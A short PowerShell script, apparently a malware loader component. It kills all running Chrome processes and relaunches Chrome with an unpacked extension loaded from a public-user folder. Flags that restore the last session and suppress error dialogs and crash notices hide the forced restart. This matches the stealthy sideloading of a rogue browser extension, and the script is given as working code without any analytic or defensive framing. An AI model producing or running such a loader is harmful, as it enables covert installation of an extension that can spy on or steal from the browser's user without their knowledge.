$extPath = "C:\Users\Public\Chrome"
#$extpath1 = "C:\Users\Public\Chrome\Update"

Get-Process -Name chrome -ErrorAction SilentlyContinue | ForEach-Object {
    $_.Kill()
}

if (Test-Path -Path $extPath) {
    try {
        Start-Process chrome "--load-extension=`"$extPath`", --restore-last-session, --noerrdialogs, --disable-session-crashed-bubble" -ErrorAction Stop
    } catch {
        $_
    }
} else {
    "Extension directory not found."
}
